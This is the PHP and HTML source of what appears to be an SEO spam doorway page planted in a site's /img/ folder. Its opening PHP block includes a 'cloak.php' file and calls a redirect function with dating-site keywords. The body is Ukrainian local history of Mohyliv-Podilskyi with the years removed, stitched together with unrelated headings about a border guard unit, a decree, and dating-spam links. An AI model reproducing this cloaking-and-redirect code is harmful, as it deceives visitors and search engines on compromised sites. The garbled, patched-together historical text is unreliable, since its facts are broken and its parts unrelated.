<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d1%81%d1%82%d0%b0%d1%80%d1%88%d1%96+%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2%d0%b0+%d0%9c%d0%be%d0%b3%d0%b8%d0%bb%d1%96%d0%b2-%d0%9f%d0%be%d0%b4%d1%96%d0%bb%d1%8c%d1%81%d1%8c%d0%ba%d0%b8%d0%b9+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>МОГИЛІВ-ПОДІЛЬСЬКИЙ ПРИКОРДОННИЙ ЗАГІН</title>
	<meta name="description" content="Знайомства Могилів-Подільський. знайомства Іршава • знайомства Кирнасівка · Знайомства України · Знайомства Вінницька область" />
	<link rel="canonical" href="https://masage.od.ua/img/184/cowi-starsh-znayomstva-mogilv-podlskiy.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/237/xove-dodatok-dlya-pdklyuchennya.php">додаток для підключення Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/240/ren-mzhrasov-sayti.php">міжрасові сайти знайомств поблизу Сорокине Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/137/nefu-zona-znayomstv.php">зона знайомств Кадіївка Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Старші знайомства Могилів-Подільський Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Серед них: грамота року Францішека Селезія Потоцького на заснування вірменської парафії, привілей власника міста року на запровадження вірменського війтівства, привілей короля на відкриття в Могилеві з року двотижневої ярмарки. Привілей на торги свідчить про те, що місто було основним посередником торгівлі на Поділлі між Туреччиною і Валахією, мало право складу на вино. З успішним розвитком торгівлі та ремесел, що давали достатні матеріальні блага, формується і духовна культура міського населення.</p>
<p>Саме в цей час у Могилеві будуються культові храми різних релігійних конфесій, що прикрашають своєю архітектурою місто і сьогодні, хоч деякі з них не збереглися. Перші згадки про поселення на місці сучасного Могилева-Подільського датовані роком. Місто було засноване в році. Засновником міста вважається Могила Ієремія , що побудував на цьому місці свій замок і що пізніше подарував ці землі своєму зятеві, Стефану Потоцькому.</p>
<p>У подяку за це і на згадку тестеві останній назвав місто Могилевом. Надалі місто носило ім'я Могилів на Дністрі і лише за радянських часів одержало свою теперішню назву — Могилів-Подільській. У році гетьман Петро Конашевич Сагайдачний почав звідси похід на Хотин. У році утворено Могилівський полк. В році коронний гетьман Стефан Чарнецький спалив місто — багато могилівчан втекло до Буші , де брали участь в її обороні. До місто відновили, до складу полку входило близько 20 тисяч левенців так в народі називали тодішніх придністровських козаків , вже тоді розпочинав службу Остап Гоголь ймовірний прадід Миколи Гоголя.</p>
<p>Під керівництвом гетьмана Петра Дорошенка вони брали участь у багатьох знаменитих битвах, а в році Остап Гоголь приймає пропозицію короля Яна III Собеського і бере участь у битві з турками під Віднем.</p><img src="https://img01.obyava.ua/classified/0/1443/36/440-1il5ms5s3gkoi9kc.jpg" alt="Власність та дозволи МОГИЛІВ-ПОДІЛЬСЬКИЙ ПРИКОРДОННИЙ ЗАГІН" style="max-width: 480px; max-height: 480px;"/><p>У цій битві була вщент розгромлена турецька армія. Козаки Остапа Гоголя разом з польським військом врятували тоді Європу від турецького війська. З жовтня року і до року полковником був Остап Гоголь. Впродовж всієї своєї історії місто знаходилося в епіцентрі всіх тих подій, що відбувалися в цьому регіоні України. Могилів-Подільській і його мешканці знесли безліч війн і нападів, численні повстання і зміни влади. У Могилеві-Подільському розташовувалась штаб-квартира польського гетьмана С. Жолкевського , що прославився у визвольних війнах проти турків. Саме тут починає свій шлях гетьман Петро Сагайдачний.</p>
<p>У коштом Францішека Салезія Потоцького було збудовано дерев'яний римо-католицький костел на честь святого Юрія стараннями ксьондза, пробоща парафії Шимона Кшиштофовича Христофовича. Проіснував храм півстоліття  - до року. Але поряд з ним, в році, було закладено [2] новий кам'яний вірмено-католицький костел під назвою «Відвідини Пресвятою Дівою Марією святої Єлизавети». На побудову було затрачено злотих, зібраних тим же ксьондзом Шимоном Христофовичем Шимон, Симон, Сімеон Кшиштофович польською Szymon Krzysztofowicz , більшу частину яких, пожертвував знову ж Ф-С.</p>
<p>Повністю будівництво костелу було завершено в році вже сином Потоцького Станіславом-Щенсним.</p>
		
	<p>В цьому храмі перебував чудотворний образ Богородиці, а вишукану архітектуру приміщення та зовнішніх стін прикрашав родовий герб Потоцьких Пилява [3]. Могилів був поділений ще на три православні парафії: Свято-Миколаївську, Георгіївську і Покровську. Кам'яний Собор на честь Святого Миколая — чудотворця був побудований в стараннями прихожан — болгар, сербів, молдован. Побудований він у візантійському стилі, окремо від церкви стояла кам'яна чотирикутна дзвіниця в два поверхи.</p>
<p>В соборі знаходився храмовий образ Святого Миколая, що почитався як чудотворний і була срібна дароносиця, пожертвувана імператором Олександром III в пам'ять покійного царевича Миколи Олександровича. У в приході була відкрита церковно-приходська школа. А в на її місці був закладений кам'яний храм на честь Св. Георгія-Переможця , який будувався за проектом архітектора Фрейвольда і закінчений в  У клопотами і на кошти могилівського купця Леонтія Ареціанова було відкрито церковно-приходську школу, на користь якої він заповідав рублів. У Покровській парафії, до якого належало невеличке село Острови, з року було відкрито міське двокласне училище.</p><strong><a id='l1'></a><h2>МОГИЛІВ-ПОДІЛЬСЬКИЙ ПРИКОРДОННИЙ ЗАГІН — Код ЄДРПОУ </h2></strong><p>У передмісті Немія у збудовано дерев'яну хрестоподібну в плані церкву Святої Параскеви, справжньою основою якої був хрест, як джерело символ спасіння. Всі ці культові храми були чудовою прикрасою тогочасного міста. Наприкінці 18 століття на Поділлі існувала єдина друкарня з кириличним шрифтом — Могилів-Подільська друкарня протоієрея Михайла Стрільбицького.</p>
<p>Всі необхідні для друкарні матеріали — шрифт, гравюри були взяті з друкарні Київо-Печерської Лаври. Відомо 4 видання цієї друкарні. Вони мають світський та релігійний зміст, надруковані церковнослов'янською та молдавською мовами. Пізніше, з по роки, у Могилеві існувала ще одна друкарня — єврейська. З  р. місто користувалося власною печаткою з гербом: у щиті — могила з трьома верхами, середній з яких увінчаний семипроменевим хрестом родовим гербом Потоцьких — «Пилява».</p>
<p>Наприкінці 18 на початку 19 ст. Могилів був одним з найкращих повітових міст Поділля, як за зовнішнім виглядом, так і за розвитком економіки. Місто славилось своїми садами, виноградниками, забрукованими вулицями, виробами місцевих ремісників, а також купецькими родинами. Такими родинами були купецькі фірми братів Рафаловичів та Ашкеназі. Греки та вірмени виготовляли чудові шкіряні та сап'янові вироби. Але місто почали спіткати різні біди та нещастя. В році тут було виявлено чуму, завезену разом з хутром зі Сходу.</p>
<p>Чума повторилась в і в роках.</p>
		
	<p>В , та роках Могилів сильно постраждав від великої повені на Дністрі, але найбільше в році від пожежі, що знищила замок і найкращих будинків. Всі ці нещастя привели Могилів до часткового занепаду. Греки і вірмени почали залишати місто, продаючи свої склади та торгові лавки євреям, які поступово прибрали до своїх рук всю місцеву торгівлю. Після другого розподілу Речі Посполитої, в році, до Російська імперія анексували українські землі Подільського та Брацлавського воєводств.</p><a id='l2'></a><h3>Президент України; Указ від 23.08.2017 № 233/2017</h3><p>Пізніше реорганізовані в Подільську губернію з адміністративним центром Кам'янець — Подільський. Старі магнатські резиденції переходять до рук російських поміщиків, помістя дробляться і перепродаються. Католицизм різко обмежується, католицькі монастирі перетворюються в монастирі православні. У Могилів став повітовим містом Брацлавського намісництва з  — Подільської губернії , а 22 січня  р.</p>
<p>для міста затверджено новий герб: «У верхній частині щита герб Брацлавський. У нижній на срібному тлі виноград, що росте, який в околицях цього міста добре родить». У Могилів, що становив до цього часу приватну власність Потоцьких, був викуплений російським урядом у Вінцентія Потоцького за   рублів сріблом.</p>
		
	<p>У 19 ст. торгівля в місті розквітала. Особливо важливу роль у розвитку різних видів торгівлі відігравала річка Дністер. Про розмах річкових перевезень свідчать такі факти. В році по Дністру пройшло суден із зерновим хлібом і лісових плотів, а вартість перевезеної продукції становила 1   карбованців. Окрім водного транспорту, з 19 ст.</p><strong><a id='l3'></a><h2>Знайомства Могилів-Подільський</h2></strong><p>потреби місцевих торговців почав обслуговувати залізничний транспорт. У році закінчилось будівництво залізниці Жмеринка — Могилів. Найбільш жвавими були зв'язки місцевих купців з Одесою, містами Молдови та землями, що входили до складу Австрійської імперії. В році у Могилеві налічувалось 56 промислових підприємств: 3 миловарних заводи, 4 свічко-сальних, 5 шкіряних, пивоварний, маслоробня, 3 водяних млини, 9 цегельно-черепичних, 17 гончарних, 3 заводи мінеральних вод, а також 2 друкарні, 2 фотографії, крамниці, 6 магазинів, 43 трактири, 13 заїжджих дворів, 19 винних складів і погребів.</p>
<p>До числа промислових підприємств у додався невеликий чавуноливарний завод, збудований у передмісті Немія міщанином німецького походження Германом Келдером. В році в міську казну надійшло , 8 карбованців від продажу документів на право заняття торгівлею та промислами, крб. від прибутків трактирних закладів, заїжджих дворів та продовольчих лавок.</p>
<p>Важливою сферою діяльності населення міста було сільське господарство, яким займалось сімей. В Могилеві було дві лікарні на 47 ліжок — християнська і єврейська, жіночий приватний пансіон, який нараховував 7 класів. За даними Всеросійського перепису населення в році в Могилеві проживало 22 осіб.</p>
		
			
				<div>Україна - соборна країна. Могилів-Подільський</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/aG_9BEtksw4' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>Мешканці міста і довколишніх сіл брали активну участь в антифеодальному повстанні, в році, під керівництвом Максима Залізняка і Івана Ґонти. У , після численних змін влади, місто було викуплене російською скарбницею у його польських господарів і було приєднано до Російської Імперії. У місту був наданий статус повітового міста у складі Подільської губернії. З другої половини XIX століття , з розвитком судноплавства на річці Дністер, Могилів-Подільській став центром хлібної торгівлі в Подністров'ї.</p>
<p>Пристань у Могилеві відносилась до числа трьох найбільших на Поділлі, що перетворила місто на один із найжвавіших торгових центрів Правобережної України. У році у місті нараховувалося 1,5 тис. Могилівські купці контролювали товарні потоки, що йшли Дністром із Поділля та Галичини до Одеського морського порту ліс, хліб, борошно, вапно, спирт, сухофрукти, шкіри тощо. Міська торговельна мережа нараховувала 9 магазинів та лавки, до того ж, Могилів мав права на проведення щорічно двох двотижневих ярмарок.</p>
<p>Крім торгівлі жителі Могилева-Подільського займались різними видами ремесел, у  р. у місті нараховувалось ремісників, які представляли 25 спеціальностей. Найбільше було шевців чол. Промисловість у середині XIX століття була незначною — діяло 2 тютюнових, 4 сально-свічкових, 8 шкіряних підприємства, одна салотопня та одна миловарня. Важливими подіями для Могилева-Подільського стали: поява у році телеграфного сполучення, розробка та затвердження у році плану розвитку та забудови міста, відкриття у — роках реального училища.</p>
<p>Стрімкого розвитку місто набуло після прокладання залізниці: у серпні стала до ладу залізнична ліня Жмеринка — Могилів, а у грудні року Могилів—Окниця—Новоселиця. Це сприяло розвитку промисловості — були відкриті чавуноливарний і механічний завод  р. Зросло населення міста, яке згідно з переписом року склало мешканців четвертий показник у Подільській губернії після Кам'янець-Подільського, Вінниці та Проскурова. чоловік  р.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/103/zyc-pdklyuchiti-veb.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/454/xowal-hristiyansk-sayti.php">християнські сайти знайомств в Хмельницький Україна</a></li><li><a href="https://masage.od.ua/img/471/topob-profl-znayomstv-bolgrad.php">профілі знайомств Болград Україна</a></li><li><a href="https://masage.od.ua/img/280/fir-sluzhbi-znayomstv-v.php">служби знайомств в Василівка Україна</a></li><li><a href="https://masage.od.ua/img/398/cehav-znayomstva-tsvtut-v.php">знайомства цвітуть в Україна</a></li><li><a href="https://masage.od.ua/img/494/xyhy-ponad-40-shvidksnih.php">понад 40 швидкісних побачень у Гребінка Україна</a></li><li><a href="https://masage.od.ua/img/352/nygah-talya-znayomstva-v.php">Італія знайомства в Бахмут Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Articles</h2>
				<ol><li><a href='#l1'>МОГИЛІВ-ПОДІЛЬСЬКИЙ ПРИКОРДОННИЙ ЗАГІН — Код ЄДРПОУ </a></li>
<li><a href='#l2'>Президент України; Указ від 23.08.2017 № 233/2017</a></li>
<li><a href='#l3'>Знайомства Могилів-Подільський</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/398/hysa-azatska-sluzhba-znayomstv.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>